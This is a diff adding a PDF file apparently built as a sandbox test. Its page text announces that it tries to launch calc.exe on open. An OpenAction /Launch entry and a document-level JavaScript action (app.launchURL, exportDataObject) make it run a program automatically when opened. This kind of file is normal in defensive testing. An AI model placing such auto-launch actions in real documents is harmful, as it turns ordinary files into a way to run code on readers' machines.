@@ -1,0 +1,45 @@
+%PDF-1.5
+%‚„œ”
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R /Names << /JavaScript 6 0 R >> >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 7 0 R >> >> >>
+endobj
+4 0 obj
+<< /Length 82 >>
+stream
+BT /F1 14 Tf 60 720 Td (SANDBOX TEST - PDF tries to Launch calc.exe on open) Tj ET
+endstream
+endobj
+5 0 obj
+<< /Type /Action /S /Launch /Win << /F (calc.exe) >> /F (calc.exe) >>
+endobj
+6 0 obj
+<< /Names [ (calc) 8 0 R ] >>
+endobj
+7 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
+endobj
+8 0 obj
+<< /Type /Action /S /JavaScript /JS (try{app.launchURL('calc.exe',true);}catch(e){}try{this.exportDataObject({cName:'x'});}catch(e){}) >>
+endobj
+xref
+0 9
+0000000000 65535 f 
+0000000015 00000 n 
+0000000113 00000 n 
+0000000170 00000 n 
+0000000296 00000 n 
+0000000428 00000 n 
+0000000513 00000 n 
+0000000558 00000 n 
+0000000628 00000 n 
+trailer
+<< /Size 9 /Root 1 0 R >>
+startxref
+781
+%%EOF
